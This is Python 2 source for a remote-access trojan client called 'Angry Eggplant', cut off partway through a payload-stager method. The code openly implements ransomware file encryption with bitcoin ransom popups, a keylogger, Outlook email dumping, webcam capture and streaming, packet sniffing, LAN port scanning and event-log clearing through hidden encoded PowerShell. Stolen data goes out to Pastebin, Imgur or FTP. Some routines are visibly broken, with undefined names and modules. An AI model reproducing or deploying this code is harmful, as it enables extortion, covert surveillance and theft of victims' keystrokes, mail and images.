#!/usr/bin/python

from __future__ import print_function

for package in ['os', 'sys', 'mss', 'cv2', 'wmi', 'time', 'json', 'zlib', 'uuid', 'numpy', 'Queue', 'base64', 'ctypes', 'pickle', 'struct', 'socket', 'random', 'ftplib', 'urllib', 'twilio', 'pyHook', 'pyxhook', 'hashlib', 'urllib2', 'marshal', 'zipfile', '_winreg', 'win32com', 'pythoncom', 'functools', 'threading', 'cStringIO', 'subprocess', 'collections', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.PublicKey.RSA', 'Crypto.Cipher.PKCS1_OAEP']:
    try:
        exec 'import {}'.format(package) in globals()
    except ImportError as e:
        print("{0} import error: {1}".format(package, str(e)))


# Decorator to make a function a Client shell command
def command(*arg, **options):
    def _command(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _command


# Decorator for making a function threaded
def threaded(function):
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded



class Client():
    """
    Angry Eggplant Client
    
    """

    _debug   = bool()
    _abort   = bool()
    _jobs    = Queue.Queue()
    _lock    = threading.Lock()
    _flags   = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}

    def __init__(self, config=None):
        """
        initiate a new Client instance
        """
        self._sysinfo = self._get_system()
        self._command = self._get_commands()
        self._workers = collections.OrderedDict()
        self._results = collections.OrderedDict()
        self._network = collections.OrderedDict()
        self._session = collections.OrderedDict()
        self._payload = collections.OrderedDict()


    @staticmethod
    def _get_id():
        try:
            return Crypto.Hash.MD5.new(Client._get_public_ip() + Client._get_mac_address()).hexdigest()
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_id.func_name, str(e)))


    @staticmethod
    def _get_platform():
        try:
            return sys.platform
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_platform.func_name, str(e)))


    @staticmethod
    def _get_public_ip():
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_public_ip.func_name, str(e)))


    @staticmethod
    def _get_local_ip():
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_local_ip.func_name, str(e)))


    @staticmethod
    def _get_mac_address():
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_mac_address.func_name, str(e)))


    @staticmethod
    def _get_architecture():
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_architecture.func_name, str(e)))


    @staticmethod
    def _get_device():
        try:
            return socket.getfqdn(socket.gethostname())
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_device.func_name, str(e)))


    @staticmethod
    def _get_username():
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_username.func_name, str(e)))


    @staticmethod
    def _get_administrator():
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_administrator.func_name, str(e)))


    @staticmethod
    def _get_if_ipv4(address):
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False


    @staticmethod
    def _get_random_var(length=6):
        try:
            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_random_var.func_name, str(e)))


    @staticmethod
    def _get_job_status(timestamp):
        try:
            assert float(timestamp)
            c = time.time() - float(timestamp)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_job_status.func_name, str(e)))


    @staticmethod
    def _get_post_request(url, headers={}, data={}):
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.headers[key] = value
            return urllib2.urlopen(req).read()
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_post_request.func_name, str(e)))


    @staticmethod
    def _get_windows_alert(text, title):
        try:
            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
            t.daemon = True
            t.start()
            return t
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_windows_alert.func_name, str(e)))


    @staticmethod
    def _get_normalized_data(source):
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            Client.debug("{} error: {}".format(Client._upload_imgur.func_name, str(e2)))


    @staticmethod
    def _get_new_registry_key(registry_key, key, value):
        try:
            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
            _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
            _winreg.CloseKey(reg_key)
            return True
        except Exception as e:
            Client.debug("{} error: {}".format(str(e)))
        return False


    @staticmethod
    def _get_png_from_data(image):
        try:
            if type(image) == numpy.ndarray:
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            else:
                width, height = (image.width, image.height)
                data = image.rgb
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_png_from_data.func_name, str(e)))


    @staticmethod
    def _get_emails_as_json(emails):
        try:
            output = collections.OrderedDict()
            while True:
                try:
                    email = emails.GetNext()
                except: break
                if email:
                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
                    subject  = email.Subject.encode('ascii','ignore')
                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                    result   = {'from': sender, 'subject': subject, 'message': message}
                    output[received] = result
                else: break
            return output
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_emails_as_json.func_name, str(e)))


    @staticmethod
    def _get_delete(target):
        if isinstance(target, str):
            if os.path.isfile(target):
                try:
                    os.chmod(target, 777)
                except: pass
                if os.name is 'nt':
                    try:
                        _ = os.popen('attrib -h -s -r %s' % target).read()
                    except: pass
                try:
                    os.remove(target)
                except: pass
                try:
                    _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            elif os.path.isdir(target):
                try:
                    _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            else:
                Client.debug("{} error: file not found - '{}'".format(Client._get_delete.func_name, filepath))
        else:
            Client.debug("{} error: expected {}, received {}".format(Client._get_delete.func_name, str, type(filepath)))


    @staticmethod
    @config(platforms=['win32'])
    def _get_clear_system_logs():
        for log in ["application","security","setup","system"]:
            try:
                output = self._get_powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\\"%s\\")}"' % log)
                if output:
                    Client.debug(output)
            except Exception as e:
                Client.debug("{} error: {}".format(Client.abort.func_name, str(e)))


    def _get_kwargs(self, inputstring):
        try:
            return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
        except Exception as e:
            Client.debug("{} error: {}".format(Client._get_kwargs_from_string.func_name, str(e)))


    def _get_system(self):
        info = {}
        for key in ['id', 'public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            value = '_get_%s' % key
            if hasattr(Client, value):
                try:
                    info[key] = getattr(Client, value)()
                except Exception as e:
                    self.debug("{} error: {}".format(self._get_system.func_name, str(e)))
        return info


    def _get_commands(self):
        commands = {}
        for cmd in vars(Client):
            if hasattr(vars(Client)[cmd], 'command'):
                try:
                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Client, cmd).platforms, 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip()}
                except Exception as e:
                    Client.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
        return commands


    def _get_restart(self, output=None):
        try:
            if not output:
                output = 'connection'
            self.debug("{} failed - restarting in 5 seconds...".format(output))
            self.kill()
            time.sleep(5)
            os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
        except Exception as e:
            self.debug("{} error: {}".format(self._get_restart.func_name, str(e)))


    @threaded
    def _get_packets(self, **kwargs):
        seconds = kwargs.get('seconds') if kwargs.get('seconds') else 30
        mode    = kwargs.get('mode') if kwargs.get('mode') else 'pastebin'
        limit   = time.time() + seconds
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = self._packetsniffer_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = self._packetsniffer_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        try:
            output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
            result = self._upload_pastebin(output) if 'ftp' not in mode else self._upload_ftp(output, filetype='.pcap')
        except Exception as e:
            self.debug("{} error: {}".format(self._get_packets.func_name, str(e)))


    def _get_powershell_exec(self, code):
        if os.name is 'nt':
            try:
                powershell = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' if os.path.exists('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe') else os.popen('where powershell').read().rstrip()
                return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
            except Exception as e:
                self.debug("{} error: {}".format(self._get_powershell_exec.func_name, str(e)))


    def _aes_encrypt(self, data, key):
        try:
            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            output = b''.join((cipher.nonce, tag, ciphertext))
            return base64.b64encode(output)
        except Exception as e:
            self.debug("{} error: {}".format(self._aes_encrypt.func_name, str(e)))


    def _aes_encrypt_file(self, filepath, key=None):
        try:
            if os.path.isfile(filepath):
                if not key:
                    key = self._session['key']
                with open(filepath, 'rb') as fp:
                    plaintext = fp.read()
                ciphertext = self._aes_encrypt(plaintext, key)
                with open(filepath, 'wb') as fd:
                    fd.write(ciphertext)
                return filepath
            else:
                return "File '{}' not found".format(filepath)
        except Exception as e:
            return "{} error: {}".format(self._aes_encrypt_file.func_name, str(e))


    def _aes_decrypt(self, data, key):
        try:
            data = cStringIO.StringIO(base64.b64decode(data))
            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        except Exception as e1:
            self.debug("{} error: {}".format(self._aes_decrypt.func_name, str(e1)))
            try:
                return cipher.decrypt(ciphertext)
            except Exception as e2:
                return "{} error: {}".format(self._aes_decrypt.func_name, str(e2))


    def _aes_decrypt_file(self, filepath, key=None):
        try:
            if os.path.isfile(filepath):
                if not key:
                    key = self._session['key']
                with open(filepath, 'rb') as fp:
                    ciphertext = fp.read()
                plaintext = self._aes_decrypt(ciphertext, key)
                with open(filepath, 'wb') as fd:
                    fd.write(plaintext)
                return filepath
            else:
                return "File '{}' not found".format(filepath)
        except Exception as e:
            return "{} error: {}".format(self._aes_decrypt_file.func_name, str(e))


    def _upload_imgur(self, source):
        try:
            api_key  = self._server_resource('api imgur api_key')
            if api_key:
                data = self._get_normalized_data(source)
                post = self._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})
                return str(json.loads(post)['data']['link'])
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self._upload_imgur.func_name, str(e2))


    def _upload_pastebin(self, source):
        try:
            api = self._server_resource('api pastebin')
            if api:
                data = self._get_normalized_data(source)
                info = {'api_option': 'paste', 'api_paste_code': data}
                info.update({'api_user_key': api['api_user_key']})
                info.update({'api_dev_key' : api['api_dev_key']})
                paste = self._get_post_request('https://pastebin.com/api/api_post.php', data=info)
                return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
            else:
                return "No Pastebin API Key found"
        except Exception as e:
            return '{} error: {}'.format(self._upload_pastebin.func_name, str(e))


    def _upload_ftp(self, source, filetype=None):
        try:
            creds = self._server_resource('api ftp')
            if creds:
                path  = ''
                local = time.ctime().split()
                if os.path.isfile(str(source)):
                    path   = source
                    source = open(str(path), 'rb')
                elif hasattr(source, 'seek'):
                    source.seek(0)
                else:
                    source = cStringIO.StringIO(bytes(source))
                try:
                    host = ftplib.FTP(**creds)
                except:
                    return "Upload failed - remote FTP server authorization error"
                addr = self._get_public_ip()
                if 'tmp' not in host.nlst():
                    host.mkd('/tmp')
                if addr not in host.nlst('/tmp'):
                    host.mkd('/tmp/{}'.format(addr))
                if path:
                    path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
                else:
                    if filetype:
                        filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                    else:
                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
                stor = host.storbinary('STOR ' + path, source)
                return path
        except Exception as e2:
            return "{} error: {}".format(self._upload_ftp.func_name, str(e2))


    def _ransom_payment(self, bitcoin_wallet=None, payment_url=None):
        try:
            if os.name is 'nt':
                if bitcoin_wallet:
                    alert = self._get_windows_alert(text = "Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). Below is the temporary bitcoin wallet address created for the transfer. It expires in 12 hours from now at %s, at which point the encryption key will be deleted unless you have paid." %  time.localtime(time.time() + 60 * 60 * 12))
                elif payment_url:
                    alert = self._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(self._session['id'], payment_url), "Windows Alert")
                return "Launched a Windows Message Box with ransom payment information"
            else:
                return "{} does not yet support {} platform".format(self._ransom_payment.func_name, sys.platform)
        except Exception as e:
            return "{} error: {}".format(self._ransom_payment.func_name, str(e))


    def _ransom_encrypt(self, args):
        try:
            if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
                aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
                ransom  = self._aes_encrypt_file(path, key=aes_key)
                cipher  = Crypto.Cipher.PKCS1_OAEP.new(self.ransom.pubkey)
                key     = base64.b64encode(cipher.encrypt(aes_key))
                self._get_new_registry_key(self.ransomregistry_key, path, key)
                task    = 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?')
                self._task_save(task, key)
                self.debug('{} encrypted'.format(path))
                if 'ransom' not in self._workers or not len([k for k in self._workers if 'ransom' in k if self._workers[k].is_alive()]):
                    rnd = random.randint(11,99)
                    self._workers['ransom-{}'.format(rnd)] = threading.Thread(target=self._task_threader, name=time.time())
                    self._workers['ransom-{}'.format(rnd)].daemon = True
                    self._workers['ransom-{}'.format(rnd)].start()
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_encrypt.func_name, str(e)))


    def _ransom_decrypt(self, args):
        try:
            rsa_key, aes_key, path = args
            cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
            aes     = cipher.decrypt(base64.b64decode(aes_key))
            result  = self._aes_decrypt_file(path, key=aes)
            self.debug('%s decrypted' % result)
            if 'ransom' not in self._workers or not len([k for k in self._workers if 'ransom' in k if self._workers[k].is_alive()]):
                rnd = random.randint(11,99)
                self._workers['ransom-{}'.format(rnd)] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers['ransom-{}'.format(rnd)].daemon = True
                self._workers['ransom-{}'.format(rnd)].start()
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))


    def _ransom_encrypt_threader(self, target):
        try:
            if os.path.isfile(target):
                return self._ransom_encrypt(target)
            elif os.path.isdir(target):
                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, d, f: [self._queue.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
                self._workers["ransom-tree-walk"].daemon = True
                self._workers["ransom-tree-walk"].start()
                for i in range(1,10):
                    self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
                    self._workers["ransom-%d" % i].daemon = True
                    self._workers["ransom-%d" % i].start()
                workers = self._workers.items()
                for key, value in workers:
                    if 'ransom' in key:
                        try:
                            value.join()
                        except: pass
                result  = {}
                results = self._results.items()
                for k,v in results:
                    if 'ransom encrypt' in v.get('command') and '?' in v.get('command'):
                        if len(json.dumps(result)) < 48000:
                            result[k] = v
                        else:
                            break
                return json.dumps(result)
            else:
                return "error: {} not found".format(target)
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_encrypt_threader.func_name, str(e)))


    def _ransom_decrypt_threader(self, private_rsa_key):
        try:
            rsa_key  = Crypto.PublicKey.RSA.importKey(private_rsa_key)
            for key, value in self._results.items():
                cmd1, _, cmd2 = value.get('command').partition(' ')
                path = cmd2.partition(' ')[2].replace('?','/')
                if 'ransom' in cmd1 and 'encrypt' in cmd2 and os.path.exists(path):
                    aes_key = value.get('result')
                    self._queue.put_nowait((self._ransom_decrypt, (rsa_key, aes_key, path)))
            for i in range(1,10):
                self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers["ransom-%d" % i].daemon = True
                self._workers["ransom-%d" % i].start()
            return "Ransomed files are being decrypted"
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_decrypt_threader.func_name, str(e)))


    def _sms_send(self, phone_number, message):
        try:
            phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
            cli = twilio.rest.Client(self._server_resource('api twilio account_sid'), self._server_resource('api twilio auth_token'))
            msg = cli.api.account.messages.create(to=phone_number, from_=self._server_resource('api twilio phone_number'), body=message)
            return "SUCCESS: text message sent to {}".format(phone_number)
        except Exception as e:
            return "{} error: {}".format(self._sms_send.func_name, str(e))


    @threaded
    def _email_dump(self, *args, **kwargs):
        try:
            pythoncom.CoInitialize()
            mode    = args[0] if len(args) else 'ftp'
            outlook = win32com.Client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = self._get_emails_as_json(inbox.Items)
            result  = self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
        except Exception as e2:
            result  = "{} error: {}".format(self._email_dump.func_name, str(e2))


    def _email_search(self, string):
        try:
            pythoncom.CoInitialize()
            outlook = win32com.Client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = self._get_emails_as_json(inbox.Items)
            for k,v in emails.items():
                if string not in v.get('message') and string not in v.get('subject') and string not in v.get('from'):
                    emails.pop(k,v)
            return json.dumps(emails, indent=2)
        except Exception as e:
            return "{} error: {}".format(self._email_search.func_name, str(e))


    def _email_count(self, *args, **kwargs):
        try:
            pythoncom.CoInitialize()
            outlook = win32com.Client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = inbox.Items
            return "\n\tEmails in Outlook inbox: %d" % len(emails)
        except Exception as e:
            return "{} error: {}".format(self._email_search.func_name, str(e))


    @threaded
    def _keylogger(self, *args, **kwargs):
        while True:
            try:
                hm = pyHook.HookManager() if os.name is 'nt' else pyxhook.HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                pythoncom.PumpMessages() if os.name is 'nt' else time.sleep(0.1)
            except Exception as e:
                self.debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
                break


    @threaded
    def _keylogger_auto(self, *args, **kwargs):
        while True:
            try:
                if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                    result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                    self._task_save(self.keylogger.func_name, result)
                    self.keylogger.buffer.reset()
                elif self._abort:
                    break
                else:
                    time.sleep(5)
            except Exception as e:
                self.debug("{} error: {}".format(self._keylogger_auto.func_name, str(e)))
                break


    def _keylogger_status(self,  *args, **kwargs):
        try:
            mode    = 'running' if 'keylogger' in self._workers else 'stopped'
            status  = self._get_job_status(float(m._workers['keylogger'].name))
            length  = self.keylogger.buffer.tell()
            return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.func_name, mode, status, length)
        except Exception as e:
            return '{} error: {}'.format(self._keylogger_status.func_name, str(e))


    def _keylogger_event(self, event):
        try:
            if event.WindowName != vars(self.keylogger)['window']:
                vars(self.keylogger)['window'] = event.WindowName
                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
            if event.Ascii > 32 and event.Ascii < 127:
                self.keylogger.buffer.write(chr(event.Ascii))
            elif event.Ascii == 32:
                self.keylogger.buffer.write(' ')
            elif event.Ascii in (10,13):
                self.keylogger.buffer.write('\n')
            elif event.Ascii == 8:
                self.keylogger.buffer.seek(-1, 1)
                self.keylogger.buffer.truncate()
            else:
                pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._keylogger_event.func_name, str(e)))
        return True


    def _scan_ping(self, host):
        try:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                self._network[host] = {}
                return True
            else:
                return False
        except Exception as e:
            return False


    def _scan_port(self, addr):
        try:
            host = str(addr[0])
            port = str(addr[1])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((host,int(port)))
            data = sock.recv(1024)
            network_services = json.loads(self._server_resource('resource ports'))
            OpenPort = collections.namedtuple('OpenPort', ['port','protocol','service','state'])

            if data and network_services:
                info = network_services
                data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
                data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...')
                item = {port: OpenPort(port, network_services[port]['protocol'], data, 'open')}
            else:
                item = {port: {'protocol': network_services[port]['protocol'], 'service': network_services[port]['service'], 'state': 'open'}}
            self._network.get(host).update(item)
        except (socket.error, socket.timeout):
            pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_port.func_name, str(e)))


    def _scan_host(self, host):
        try:
            if self._scan_ping(host):
                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
                    self._queue.put_nowait((self._scan_port, (host, port)))
                for x in xrange(10):
                    self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                    self._workers['scanner-%d' % x].daemon = True
                    self._workers['scanner-%d' % x].start()
                self._task_manager.flag.clear()
                for x in xrange(10):
                    if self._workers['scanner-%d' % x].is_alive():
                        self._workers['scanner-%d' % x].join()
                self._task_manager.flag.set()
            return json.dumps(self._network)
        except Exception as e:
            return '{} error: {}'.format(self._scan_host.func_name, str(e))


    def _scan_network(self, *args):
        try:
            stub = '.'.join(str(self._sysinfo['private_ip']).split('.')[:-1]) + '.%d'
            lan  = []
            for i in xrange(1,255):
                lan.append(stub % i)
                self._queue.put_nowait((self._scan_ping, stub % i))
            for _ in xrange(10):
                x = random.randrange(100)
                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers['scanner-%d' % x].setDaemon(True)
                self._workers['scanner-%d' % x].start()
            self._workers['scanner-%d' % x].join()
            for ip in lan:
                self._queue.put_nowait((self._scan_host, ip))
            for n in xrange(10):
                x = random.randrange(100)
                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers['scanner-%d' % x].start()
            self._workers['scanner-%d' % x].join()
            return json.dumps(self._network)
        except Exception as e:
            return '{} error: {}'.format(self._scan_network.func_name, str(e))


    def _webcam_image(self, *args, **kwargs):
        try:
            dev = cv2.VideoCapture(0)
            r,f = dev.read()
            dev.release()
            if not r:
                self.debug(f)
                return "Unable to access webcam"
            png = self._get_png_from_data(f)
            return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
        except Exception as e:
            return '{} error: {}'.format(self._webcam_image.func_name, str(e))


    def _webcam_video(self, *args, **kwargs):
        try:
            fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
            fourcc  = cv2.VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else cv2.VideoWriter_fourcc(*'XVID')
            output  = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
            length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
            end     = time.time() + length
            dev     = cv2.VideoCapture(0)
            while True:
                ret, frame = dev.read()
                output.write(frame)
                if time.time() > end: break
            dev.release()
            result = self._upload_ftp(fpath, filetype='.avi')
            try:
                self._get_delete(fpath)
            except: pass
            return result
        except Exception as e:
            return '{} error: {}'.format(self._webcam_video.func_name, str(e))


    def _webcam_stream(self, port=None, retries=5):
        try:
            if not port or not str(port).isdigit():
                return self.webcam.usage
            host = self._session['socket'].getpeername()[0]
            port = int(port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while retries > 0:
                try:
                    sock.connect((host, port))
                except socket.error:
                    retries -= 1
                break
            if not retries:
                return 'Error: webcam stream unable to connect to server'
            dev = cv2.VideoCapture(0)
            try:
                t1 = time.time()
                while True:
                    try:
                        ret,frame=dev.read()
                        data = pickle.dumps(frame)
                        sock.sendall(struct.pack("L", len(data))+data)
                        time.sleep(0.1)
                    except Exception as e:
                        self.debug('Stream error: {}'.format(str(e)))
                        break
            finally:
                dev.release()
                sock.close()
        except Exception as e:
            return '{} error: {}'.format(self._webcam_stream.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'])
    def _payload_stager(self, *args, **kwargs):
        try:
            config  = self._server_resource('resource stager config')
            if config:
                code = self._server_resource('resource stager code')
                if code:
